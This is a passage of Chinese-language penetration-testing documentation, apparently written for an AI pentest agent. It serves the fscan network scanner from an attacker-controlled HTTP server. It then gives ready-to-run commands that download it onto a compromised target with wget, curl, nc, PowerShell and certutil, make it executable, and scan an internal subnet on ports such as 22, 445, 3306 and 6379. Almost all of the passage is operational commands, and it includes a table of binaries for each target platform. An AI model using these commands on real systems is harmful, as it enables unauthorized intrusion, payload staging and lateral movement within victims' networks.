...
# 2. 启动 HTTP 服务器（在容器中）
import subprocess
subprocess.run(["python3", "-m", "http.server", "8888"], cwd="/opt/nemo-agent/tools")

# 3. 在靶机上下载（根据目标系统选择命令）
# Linux:
cmd_linux = f"wget http://{attacker_ip}:8888/fscan_amd64 -O /tmp/fscan && chmod +x /tmp/fscan"

# Windows PowerShell:
cmd_windows = f"certutil -urlcache -split -f \"http://{attacker_ip}:8888/fscan_windows_amd64.exe\" C:\\Users\\Public\\fscan.exe"

# 4. 执行扫描
scan_cmd = "/tmp/fscan -h 192.168.1.0/24 -p 22,80,445,3306,6379,7001,8080"
```
...
| 目标系统 | 架构 | 工具文件名 |
|---------|------|-----------|
| Linux | AMD64 | `fscan_amd64` |
| Linux | ARM64 | `fscan_arm64` |
| Linux | x86 (32位) | `fscan_386` |
| Windows | AMD64 | `fscan_windows_amd64.exe` |
| Windows | x86 (32位) | `fscan_windows_386.exe` |
...
```bash
# wget
wget http://IP:8888/fscan_amd64 -O /tmp/fscan && chmod +x /tmp/fscan

# curl
curl -o /tmp/fscan http://IP:8888/fscan_amd64 && chmod +x /tmp/fscan

# nc
nc -nv IP 8888 > /tmp/fscan && chmod +x /tmp/fscan
```

**Windows:**
```powershell
# PowerShell
Invoke-WebRequest -Uri "http://IP:8888/fscan_windows_amd64.exe" -OutFile "C:\Users\Public\fscan.exe"

# certutil (内置)
certutil -urlcache -split -f "http://IP:8888/fscan_windows_amd64.exe" C:\Users\Public\fscan.exe
```

详细文档: [tools-upload 技能](../skills/pentest/core/tools-upload/SKILL.md)
